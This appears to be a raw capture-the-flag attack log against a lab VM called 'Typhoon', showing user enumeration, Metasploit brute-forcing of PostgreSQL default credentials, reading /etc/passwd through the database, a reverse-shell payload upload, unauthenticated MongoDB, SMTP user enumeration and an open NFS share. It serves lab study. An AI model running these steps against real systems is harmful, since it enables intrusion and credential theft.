+S-1-5-21-830993545-1361545238-2689178323-536 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-537 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-538 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-539 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-540 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-541 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-542 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-543 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-544 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-545 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-546 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-547 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-548 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-549 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-550 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-1000 TYPHOON\typhoon (Local User)
+S-1-5-21-830993545-1361545238-2689178323-1001 TYPHOON\admin (Local User)
+S-1-5-21-830993545-1361545238-2689178323-1002 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-1003 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-1004 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-1005 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-1006 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-1007 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-1008 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-1009 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-1010 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-1011 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-1012 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-1013 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-1014 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-1015 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-1016 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-1017 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-1018 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-1019 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-1020 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-1021 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-1022 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-1023 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-1024 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-1025 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-1026 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-1027 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-1028 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-1029 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-1030 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-1031 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-1032 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-1033 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-1034 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-1035 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-1036 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-1037 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-1038 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-1039 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-1040 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-1041 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-1042 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-1043 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-1044 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-1045 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-1046 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-1047 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-1048 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-1049 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-1050 *unknown*\*unknown* (8)
+[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
+S-1-22-1-1000 Unix User\typhoon (Local User)
+S-1-22-1-1001 Unix User\admin (Local User)
+S-1-22-1-1002 Unix User\postfixuser (Local User)
+[+] Enumerating users using SID S-1-5-32 and logon username '', password ''
+S-1-5-32-500 *unknown*\*unknown* (8)
+S-1-5-32-501 *unknown*\*unknown* (8)
+S-1-5-32-502 *unknown*\*unknown* (8)
+S-1-5-32-503 *unknown*\*unknown* (8)
+S-1-5-32-504 *unknown*\*unknown* (8)
+S-1-5-32-505 *unknown*\*unknown* (8)
+S-1-5-32-506 *unknown*\*unknown* (8)
+S-1-5-32-507 *unknown*\*unknown* (8)
+S-1-5-32-508 *unknown*\*unknown* (8)
+S-1-5-32-509 *unknown*\*unknown* (8)
+S-1-5-32-510 *unknown*\*unknown* (8)
+S-1-5-32-511 *unknown*\*unknown* (8)
+S-1-5-32-512 *unknown*\*unknown* (8)
+S-1-5-32-513 *unknown*\*unknown* (8)
+S-1-5-32-514 *unknown*\*unknown* (8)
+S-1-5-32-515 *unknown*\*unknown* (8)
+S-1-5-32-516 *unknown*\*unknown* (8)
+S-1-5-32-517 *unknown*\*unknown* (8)
+S-1-5-32-518 *unknown*\*unknown* (8)
+S-1-5-32-519 *unknown*\*unknown* (8)
+S-1-5-32-520 *unknown*\*unknown* (8)
+S-1-5-32-521 *unknown*\*unknown* (8)
+S-1-5-32-522 *unknown*\*unknown* (8)
+S-1-5-32-523 *unknown*\*unknown* (8)
+S-1-5-32-524 *unknown*\*unknown* (8)
+S-1-5-32-525 *unknown*\*unknown* (8)
+S-1-5-32-526 *unknown*\*unknown* (8)
+S-1-5-32-527 *unknown*\*unknown* (8)
+S-1-5-32-528 *unknown*\*unknown* (8)
+S-1-5-32-529 *unknown*\*unknown* (8)
+S-1-5-32-530 *unknown*\*unknown* (8)
+S-1-5-32-531 *unknown*\*unknown* (8)
+S-1-5-32-532 *unknown*\*unknown* (8)
+S-1-5-32-533 *unknown*\*unknown* (8)
+S-1-5-32-534 *unknown*\*unknown* (8)
+S-1-5-32-535 *unknown*\*unknown* (8)
+S-1-5-32-536 *unknown*\*unknown* (8)
+S-1-5-32-537 *unknown*\*unknown* (8)
+S-1-5-32-538 *unknown*\*unknown* (8)
+S-1-5-32-539 *unknown*\*unknown* (8)
+S-1-5-32-540 *unknown*\*unknown* (8)
+S-1-5-32-541 *unknown*\*unknown* (8)
+S-1-5-32-542 *unknown*\*unknown* (8)
+S-1-5-32-543 *unknown*\*unknown* (8)
+S-1-5-32-544 BUILTIN\Administrators (Local Group)
+S-1-5-32-545 BUILTIN\Users (Local Group)
+S-1-5-32-546 BUILTIN\Guests (Local Group)
+S-1-5-32-547 BUILTIN\Power Users (Local Group)
+S-1-5-32-548 BUILTIN\Account Operators (Local Group)
+S-1-5-32-549 BUILTIN\Server Operators (Local Group)
+S-1-5-32-550 BUILTIN\Print Operators (Local Group)
+S-1-5-32-1000 *unknown*\*unknown* (8)
+S-1-5-32-1001 *unknown*\*unknown* (8)
+S-1-5-32-1002 *unknown*\*unknown* (8)
+S-1-5-32-1003 *unknown*\*unknown* (8)
+S-1-5-32-1004 *unknown*\*unknown* (8)
+S-1-5-32-1005 *unknown*\*unknown* (8)
+S-1-5-32-1006 *unknown*\*unknown* (8)
+S-1-5-32-1007 *unknown*\*unknown* (8)
+S-1-5-32-1008 *unknown*\*unknown* (8)
+S-1-5-32-1009 *unknown*\*unknown* (8)
+S-1-5-32-1010 *unknown*\*unknown* (8)
+S-1-5-32-1011 *unknown*\*unknown* (8)
+S-1-5-32-1012 *unknown*\*unknown* (8)
+S-1-5-32-1013 *unknown*\*unknown* (8)
+S-1-5-32-1014 *unknown*\*unknown* (8)
+S-1-5-32-1015 *unknown*\*unknown* (8)
+S-1-5-32-1016 *unknown*\*unknown* (8)
+S-1-5-32-1017 *unknown*\*unknown* (8)
+S-1-5-32-1018 *unknown*\*unknown* (8)
+S-1-5-32-1019 *unknown*\*unknown* (8)
+S-1-5-32-1020 *unknown*\*unknown* (8)
+S-1-5-32-1021 *unknown*\*unknown* (8)
+S-1-5-32-1022 *unknown*\*unknown* (8)
+S-1-5-32-1023 *unknown*\*unknown* (8)
+S-1-5-32-1024 *unknown*\*unknown* (8)
+S-1-5-32-1025 *unknown*\*unknown* (8)
+S-1-5-32-1026 *unknown*\*unknown* (8)
+S-1-5-32-1027 *unknown*\*unknown* (8)
+S-1-5-32-1028 *unknown*\*unknown* (8)
+S-1-5-32-1029 *unknown*\*unknown* (8)
+S-1-5-32-1030 *unknown*\*unknown* (8)
+S-1-5-32-1031 *unknown*\*unknown* (8)
+S-1-5-32-1032 *unknown*\*unknown* (8)
+S-1-5-32-1033 *unknown*\*unknown* (8)
+S-1-5-32-1034 *unknown*\*unknown* (8)
+S-1-5-32-1035 *unknown*\*unknown* (8)
+S-1-5-32-1036 *unknown*\*unknown* (8)
+S-1-5-32-1037 *unknown*\*unknown* (8)
+S-1-5-32-1038 *unknown*\*unknown* (8)
+S-1-5-32-1039 *unknown*\*unknown* (8)
+S-1-5-32-1040 *unknown*\*unknown* (8)
+S-1-5-32-1041 *unknown*\*unknown* (8)
+S-1-5-32-1042 *unknown*\*unknown* (8)
+S-1-5-32-1043 *unknown*\*unknown* (8)
+S-1-5-32-1044 *unknown*\*unknown* (8)
+S-1-5-32-1045 *unknown*\*unknown* (8)
+S-1-5-32-1046 *unknown*\*unknown* (8)
+S-1-5-32-1047 *unknown*\*unknown* (8)
+S-1-5-32-1048 *unknown*\*unknown* (8)
+S-1-5-32-1049 *unknown*\*unknown* (8)
+S-1-5-32-1050 *unknown*\*unknown* (8)
+
+ ============================================== 
+|    Getting printer info for 192.168.1.104    |
+ ============================================== 
+No printers returned.
+
+
+enum4linux complete on Sat Feb  2 02:01:12 2019
+
+==========================================================================================================
+
+msf5 > use auxiliary/scanner/postgres/postgres_version
+msf5 auxiliary(scanner/postgres/postgres_version) > options
+
+Module options (auxiliary/scanner/postgres/postgres_version):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   DATABASE  template1        yes       The database to authenticate against
+   PASSWORD  postgres         no        The password for the specified username. Leave blank for a random password.
+   RHOSTS                     yes       The target address range or CIDR identifier
+   RPORT     5432             yes       The target port
+   THREADS   1                yes       The number of concurrent threads
+   USERNAME  postgres         yes       The username to authenticate as
+   VERBOSE   false            no        Enable verbose output
+
+msf5 auxiliary(scanner/postgres/postgres_version) > set RHOSTS 192.168.1.104
+RHOSTS => 192.168.1.104
+msf5 auxiliary(scanner/postgres/postgres_version) > run
+
+[*] 192.168.1.104:5432 Postgres - Version PostgreSQL 9.3.4 on x86_64-unknown-linux-gnu, compiled by gcc (Ubuntu 4.8.2-16ubuntu6) 4.8.2, 64-bit (Post-Auth)
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+msf5 auxiliary(scanner/postgres/postgres_version) > back
+
+------------------------------------------------------------------------------------------------
+
+msf5 > use auxiliary/scanner/postgres/postgres_login
+
+msf5 auxiliary(scanner/postgres/postgres_login) > options
+
+Module options (auxiliary/scanner/postgres/postgres_login):
+
+   Name              Current Setting                                                               Required  Description
+   ----              ---------------                                                               --------  -----------
+   BLANK_PASSWORDS   false                                                                         no        Try blank passwords for all users
+   BRUTEFORCE_SPEED  5                                                                             yes       How fast to bruteforce, from 0 to 5
+   DATABASE          template1                                                                     yes       The database to authenticate against
+   DB_ALL_CREDS      false                                                                         no        Try each user/password couple stored in the current database
+   DB_ALL_PASS       false                                                                         no        Add all passwords in the current database to the list
+   DB_ALL_USERS      false                                                                         no        Add all users in the current database to the list
+   PASSWORD                                                                                        no        A specific password to authenticate with
+   PASS_FILE         /usr/share/metasploit-framework/data/wordlists/postgres_default_pass.txt      no        File containing passwords, one per line
+   Proxies                                                                                         no        A proxy chain of format type:host:port[,type:host:port][...]
+   RETURN_ROWSET     true                                                                          no        Set to true to see query result sets
+   RHOSTS                                                                                          yes       The target address range or CIDR identifier
+   RPORT             5432                                                                          yes       The target port
+   STOP_ON_SUCCESS   false                                                                         yes       Stop guessing when a credential works for a host
+   THREADS           1                                                                             yes       The number of concurrent threads
+   USERNAME                                                                                        no        A specific username to authenticate as
+   USERPASS_FILE     /usr/share/metasploit-framework/data/wordlists/postgres_default_userpass.txt  no        File containing (space-seperated) users and passwords, one pair per line
+   USER_AS_PASS      false                                                                         no        Try the username as the password for all users
+   USER_FILE         /usr/share/metasploit-framework/data/wordlists/postgres_default_user.txt      no        File containing users, one per line
+   VERBOSE           true                                                                          yes       Whether to print output for all attempts
+
+msf5 auxiliary(scanner/postgres/postgres_login) > set RHOSTS 192.168.1.104
+RHOSTS => 192.168.1.104
+msf5 auxiliary(scanner/postgres/postgres_login) > run
+
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.1.104:5432 - LOGIN FAILED: :@template1 (Incorrect: Invalid username or password)
+[-] 192.168.1.104:5432 - LOGIN FAILED: :tiger@template1 (Incorrect: Invalid username or password)
+[-] 192.168.1.104:5432 - LOGIN FAILED: :postgres@template1 (Incorrect: Invalid username or password)
+[-] 192.168.1.104:5432 - LOGIN FAILED: :password@template1 (Incorrect: Invalid username or password)
+[-] 192.168.1.104:5432 - LOGIN FAILED: :admin@template1 (Incorrect: Invalid username or password)
+[-] 192.168.1.104:5432 - LOGIN FAILED: postgres:@template1 (Incorrect: Invalid username or password)
+[-] 192.168.1.104:5432 - LOGIN FAILED: postgres:tiger@template1 (Incorrect: Invalid username or password)
+
+[+] 192.168.1.104:5432 - Login Successful: postgres:postgres@template1
+
+[-] 192.168.1.104:5432 - LOGIN FAILED: scott:@template1 (Incorrect: Invalid username or password)
+[-] 192.168.1.104:5432 - LOGIN FAILED: scott:tiger@template1 (Incorrect: Invalid username or password)
+[-] 192.168.1.104:5432 - LOGIN FAILED: scott:postgres@template1 (Incorrect: Invalid username or password)
+[-] 192.168.1.104:5432 - LOGIN FAILED: scott:password@template1 (Incorrect: Invalid username or password)
+[-] 192.168.1.104:5432 - LOGIN FAILED: scott:admin@template1 (Incorrect: Invalid username or password)
+[-] 192.168.1.104:5432 - LOGIN FAILED: admin:@template1 (Incorrect: Invalid username or password)
+[-] 192.168.1.104:5432 - LOGIN FAILED: admin:tiger@template1 (Incorrect: Invalid username or password)
+[-] 192.168.1.104:5432 - LOGIN FAILED: admin:postgres@template1 (Incorrect: Invalid username or password)
+[-] 192.168.1.104:5432 - LOGIN FAILED: admin:password@template1 (Incorrect: Invalid username or password)
+[-] 192.168.1.104:5432 - LOGIN FAILED: admin:admin@template1 (Incorrect: Invalid username or password)
+[-] 192.168.1.104:5432 - LOGIN FAILED: admin:admin@template1 (Incorrect: Invalid username or password)
+[-] 192.168.1.104:5432 - LOGIN FAILED: admin:password@template1 (Incorrect: Invalid username or password)
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+msf5 auxiliary(scanner/postgres/postgres_login) > 
+
+
+---------------------------------------------------------------------------------------------
+
+msf5 > use auxiliary/admin/postgres/postgres_readfile
+
+msf5 auxiliary(admin/postgres/postgres_readfile) > options
+
+Module options (auxiliary/admin/postgres/postgres_readfile):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   DATABASE  template1        yes       The database to authenticate against
+   PASSWORD  postgres         no        The password for the specified username. Leave blank for a random password.
+   RFILE     /etc/passwd      yes       The remote file
+   RHOSTS                     yes       The target address range or CIDR identifier
+   RPORT     5432             yes       The target port
+   USERNAME  postgres         yes       The username to authenticate as
+   VERBOSE   false            no        Enable verbose output
+
+msf5 auxiliary(admin/postgres/postgres_readfile) > set RHOSTS 192.168.1.104
+RHOSTS => 192.168.1.104
+msf5 auxiliary(admin/postgres/postgres_readfile) > run
+
+Query Text: 'CREATE TEMP TABLE oRojouuQcgUQpSO (INPUT TEXT);
+      COPY oRojouuQcgUQpSO FROM '/etc/passwd';
+      SELECT * FROM oRojouuQcgUQpSO'
+================================================================================================================================================
+
+    input
+    -----
+    admin:x:1001:1001:,,,:/home/admin:/bin/bash
+    avahi:x:112:122:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
+    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+    bin:x:2:2:bin:/bin:/usr/sbin/nologin
+    bind:x:104:115::/var/cache/bind:/bin/false
+    colord:x:113:124:colord colour management daemon,,,:/var/lib/colord:/bin/false
+    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+    dnsmasq:x:106:65534:dnsmasq,,,:/var/lib/misc:/bin/false
+    dovecot:x:107:118:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false
+    dovenull:x:108:119:Dovecot login user,,,:/nonexistent:/bin/false
+    ftp:x:120:129:ftp daemon,,,:/srv/ftp:/bin/false
+    games:x:5:60:games:/usr/games:/usr/sbin/nologin
+    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+    irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+    landscape:x:109:120::/var/lib/landscape:/bin/false
+    libuuid:x:100:101::/var/lib/libuuid:
+    libvirt-dnsmasq:x:115:125:Libvirt Dnsmasq,,,:/var/lib/libvirt/dnsmasq:/bin/false
+    libvirt-qemu:x:114:107:Libvirt Qemu,,,:/var/lib/libvirt:/bin/false
+    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+    messagebus:x:103:108::/var/run/dbus:/bin/false
+    mongodb:x:117:65534::/home/mongodb:/bin/false
+    mysql:x:102:106:MySQL Server,,,:/nonexistent:/bin/false
+    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+    ntp:x:87:87:Network Time Protocol:/var/lib/ntp:/bin/false
+    postfix:x:105:116::/var/spool/postfix:/bin/false
+    postfixuser:x:1002:1002:,,,:/home/postfixuser:/bin/bash
+    postgres:x:111:121:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+    redis:x:118:128::/var/lib/redis:/bin/false
+    root:x:0:0:root:/root:/bin/bash
+    snmp:x:121:130::/var/lib/snmp:/bin/false
+    sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
+    statd:x:119:65534::/var/lib/nfs:/bin/false
+    sync:x:4:65534:sync:/bin:/bin/sync
+    sys:x:3:3:sys:/dev:/usr/sbin/nologin
+    syslog:x:101:104::/home/syslog:/bin/false
+    tomcat7:x:116:126::/usr/share/tomcat7:/bin/false
+    typhoon:x:1000:1000:typhoon,,,:/home/typhoon:/bin/bash
+    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+libuuid:x:100:101::/var/lib/libuuid:
+syslog:x:101:104::/home/syslog:/bin/false
+mysql:x:102:106:MySQL Server,,,:/nonexistent:/bin/false
+messagebus:x:103:108::/var/run/dbus:/bin/false
+bind:x:104:115::/var/cache/bind:/bin/false
+postfix:x:105:116::/var/spool/postfix:/bin/false
+dnsmasq:x:106:65534:dnsmasq,,,:/var/lib/misc:/bin/false
+dovecot:x:107:118:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false
+dovenull:x:108:119:Dovecot login user,,,:/nonexistent:/bin/false
+landscape:x:109:120::/var/lib/landscape:/bin/false
+sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
+postgres:x:111:121:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+avahi:x:112:122:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
+colord:x:113:124:colord colour management daemon,,,:/var/lib/colord:/bin/false
+libvirt-qemu:x:114:107:Libvirt Qemu,,,:/var/lib/libvirt:/bin/false
+libvirt-dnsmasq:x:115:125:Libvirt Dnsmasq,,,:/var/lib/libvirt/dnsmasq:/bin/false
+tomcat7:x:116:126::/usr/share/tomcat7:/bin/false
+typhoon:x:1000:1000:typhoon,,,:/home/typhoon:/bin/bash
+admin:x:1001:1001:,,,:/home/admin:/bin/bash
+mongodb:x:117:65534::/home/mongodb:/bin/false
+redis:x:118:128::/var/lib/redis:/bin/false
+statd:x:119:65534::/var/lib/nfs:/bin/false
+ftp:x:120:129:ftp daemon,,,:/srv/ftp:/bin/false
+snmp:x:121:130::/var/lib/snmp:/bin/false
+postfixuser:x:1002:1002:,,,:/home/postfixuser:/bin/bash
+ntp:x:87:87:Network Time Protocol:/var/lib/ntp:/bin/false
+[+] 192.168.1.104:5432 Postgres - /etc/passwd saved in /root/.msf4/loot/20190202022344_default_192.168.1.104_postgres.file_465166.txt
+[*] Auxiliary module execution completed
+
+msf5 auxiliary(admin/postgres/postgres_readfile) > back
+
+msf5 auxiliary(admin/postgres/postgres_readfile) > set RFILE /etc/shadow
+RFILE => /etc/shadow
+msf5 auxiliary(admin/postgres/postgres_readfile) > run
+
+[-] 192.168.1.104:5432 Postgres - Insufficent file permissions.
+[*] Auxiliary module execution completed
+
+
+---------------------------------------------------------------------------------------------------
+
+msf5 > use exploit/linux/postgres/postgres_payload
+msf5 exploit(linux/postgres/postgres_payload) > options
+
+Module options (exploit/linux/postgres/postgres_payload):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   DATABASE  template1        yes       The database to authenticate against
+   PASSWORD  postgres         no        The password for the specified username. Leave blank for a random password.
+   RHOSTS                     yes       The target address range or CIDR identifier
+   RPORT     5432             yes       The target port
+   USERNAME  postgres         yes       The username to authenticate as
+   VERBOSE   false            no        Enable verbose output
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Linux x86
+
+
+msf5 exploit(linux/postgres/postgres_payload) > set RHOSTS 192.168.1.104
+RHOSTS => 192.168.1.104
+msf5 exploit(linux/postgres/postgres_payload) > run
+
+[*] Started reverse TCP handler on 192.168.1.9:4444 
+[*] 192.168.1.104:5432 - PostgreSQL 9.3.4 on x86_64-unknown-linux-gnu, compiled by gcc (Ubuntu 4.8.2-16ubuntu6) 4.8.2, 64-bit
+[*] Uploaded as /tmp/dAvhuceC.so, should be cleaned up automatically
+[*] Exploit completed, but no session was created.
+
+===================================================================================================
+
+msf5 > use auxiliary/scanner/mongodb/mongodb_login
+msf5 auxiliary(scanner/mongodb/mongodb_login) > options
+
+Module options (auxiliary/scanner/mongodb/mongodb_login):
+
+   Name              Current Setting  Required  Description
+   ----              ---------------  --------  -----------
+   BLANK_PASSWORDS   false            no        Try blank passwords for all users
+   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
+   DB                admin            yes       Database to use
+   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
+   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
+   DB_ALL_USERS      false            no        Add all users in the current database to the list
+   PASSWORD                           no        A specific password to authenticate with
+   PASS_FILE                          no        File containing passwords, one per line
+   RHOSTS                             yes       The target address range or CIDR identifier
+   RPORT             27017            yes       The target port (TCP)
+   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
+   THREADS           1                yes       The number of concurrent threads
+   USERNAME                           no        A specific username to authenticate as
+   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
+   USER_AS_PASS      false            no        Try the username as the password for all users
+   USER_FILE                          no        File containing usernames, one per line
+   VERBOSE           true             yes       Whether to print output for all attempts
+
+msf5 auxiliary(scanner/mongodb/mongodb_login) > set RHOSTS 192.168.1.104
+RHOSTS => 192.168.1.104
+msf5 auxiliary(scanner/mongodb/mongodb_login) > run
+
+[*] 192.168.1.104:27017 - Scanning IP: 192.168.1.104
+[+] 192.168.1.104:27017 - Mongo server 192.168.1.104 doesn't use authentication
+[*] 192.168.1.104:27017 - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+=====================================================================================================
+
+msf5 > use auxiliary/scanner/smtp/smtp_enum
+
+msf5 auxiliary(scanner/smtp/smtp_enum) > options
+
+Module options (auxiliary/scanner/smtp/smtp_enum):
+
+   Name       Current Setting                                                Required  Description
+   ----       ---------------                                                --------  -----------
+   RHOSTS                                                                    yes       The target address range or CIDR identifier
+   RPORT      25                                                             yes       The target port (TCP)
+   THREADS    1                                                              yes       The number of concurrent threads
+   UNIXONLY   true                                                           yes       Skip Microsoft bannered servers when testing unix users
+   USER_FILE  /usr/share/metasploit-framework/data/wordlists/unix_users.txt  yes       The file that contains a list of probable users accounts.
+
+msf5 auxiliary(scanner/smtp/smtp_enum) > set RHOSTS 192.168.1.104
+RHOSTS => 192.168.1.104
+msf5 auxiliary(scanner/smtp/smtp_enum) > run
+
+[*] 192.168.1.104:25      - 192.168.1.104:25 Banner: 220 typhoon ESMTP Postfix (Ubuntu)
+[+] 192.168.1.104:25      - 192.168.1.104:25 Users found: , admin, avahi, backup, bin, daemon, ftp, games, gnats, irc, libuuid, list, lp, mail, man, messagebus, news, nobody, postgres, postmaster, proxy, sshd, sync, sys, syslog, uucp, www-data
+
+[*] 192.168.1.104:25      - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+===================================================================================================
+
+root@Security-Audit-01:~/Desktop/CTFs/Typhoon# showmount -e 192.168.1.104
+Export list for 192.168.1.104:
+/typhoon *
+
+root@Security-Audit-01:~/Desktop/CTFs/Typhoon# mount -t nfs 192.168.1.104:/typhoon /root/Desktop/CTFs/Typhoon/nfs/
+
+root@Security-Audit-01:~/Desktop/CTFs/Typhoon# cd nfs
+
+root@Security-Audit-01:~/Desktop/CTFs/Typhoon/nfs# ls
+secret
+
+root@Security-Audit-01:~/Desktop/CTFs/Typhoon/nfs# cd secret
+bash: cd: secret: Not a directory
+
+root@Security-Audit-01:~/Desktop/CTFs/Typhoon/nfs# cat secret
+test file
+<rec0nm4st3r> R3c0n_m4steeeee3er_fl4g </rec0nm4st3r>
+root@Security-Audit-01:~/Desktop/CTFs/Typhoon/nfs# 
+
+===========================================================================================================
+DNS
+===========================================================================================================
+root@Security-Audit-01:~# fierce -dns 192.168.1.104 -search typhoon.local
+
+Trying zone transfer first...
+
+Unsuccessful in zone transfer (it was worth a shot)
+Okay, trying the good old fashioned way... brute force
+
+Checking for wildcard DNS...
+Nope. Good.
+Now performing 2280 test(s)...
+
+Subnets found (may want to probe here using nmap or unicornscan):
+
+Done with Fierce scan: http://ha.ckers.org/fierce/
+Found 0 entries.
+
+Have a nice day.
+root@Security-Audit-01:~# fierce -dns 192.168.1.104 -search local
+
+Trying zone transfer first...
+
+Unsuccessful in zone transfer (it was worth a shot)
+Okay, trying the good old fashioned way... brute force
+
+Checking for wildcard DNS...
+Nope. Good.
+Now performing 2280 test(s)...
+
+Subnets found (may want to probe here using nmap or unicornscan):
+
+Done with Fierce scan: http://ha.ckers.org/fierce/
+Found 0 entries.
+
+Have a nice day.
+
+----------------------------------------
+
+C:\Users\Pen003> nslookup
+Serveur par defaut :   UnKnown
+Address:  192.168.13.254
+
+> server 192.168.13.208
